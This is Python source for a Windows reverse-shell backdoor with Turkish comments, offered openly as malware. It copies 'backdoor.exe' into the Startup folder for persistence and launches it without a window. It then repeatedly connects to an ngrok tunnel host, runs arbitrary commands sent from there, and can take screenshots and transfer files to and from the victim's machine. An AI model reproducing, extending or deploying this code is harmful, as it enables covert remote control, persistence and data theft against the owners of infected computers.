import socket
import time
import subprocess
import json
import os
import pyscreenshot
import shutil
import subprocess
import ctypes
import winreg
import sys

def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue
                        
def copy_to_startup():
    try:
        # Başlangıç klasörünü belirle
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

        # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
        source_filename = 'backdoor.exe'
        source_path = os.path.abspath(source_filename)

        # Hedef yol oluştur
        destination = os.path.join(startup_folder, source_filename)

        # Dosyayı başlangıç klasörüne kopyala
        shutil.copyfile(source_path, destination)

        # Dosyayı çalıştır
        subprocess.Popen(destination, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)

        #print(f"{source_filename} başarıyla başlangıç klasörüne kopyalandı ve çalıştırıldı.")

    except Exception as e:pass
        # print(f"Hata oluştu: {str(e)}")


def screenshot():
    tamekran_ss = pyscreenshot.grab()

    # Belgeseler klasörünün yolunu elde et
    documents_path = os.path.expanduser("~/Documents")

    # Dosya adını belirle
    file_name = "last.png"

    # Tam dosya yolu
    full_file_path = os.path.join(documents_path, file_name)

    # Ekran görüntüsünü kaydet
    tamekran_ss.save(full_file_path)

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('2.tcp.eu.ngrok.io',14178))
			shell()
			s.close()
			break
		except:
			connection()

def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())


def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()


def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		elif command == 'clear':
			pass
		elif command[:3] == 'cd ':
			os.chdir(command[3:])
		# elif command == 'cd':
		# 	komut = subprocess.check_output("cd",shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
		# 	print(komut)
		elif command == 'ss':
			screenshot()
		elif command[:8] == 'download':
			upload_file(command[9:])
		elif command[:6] == 'upload':
			download_file(command[7:])
		elif command == False:
			continue
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			reliable_send(result)
		

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
copy_to_startup()
connection()
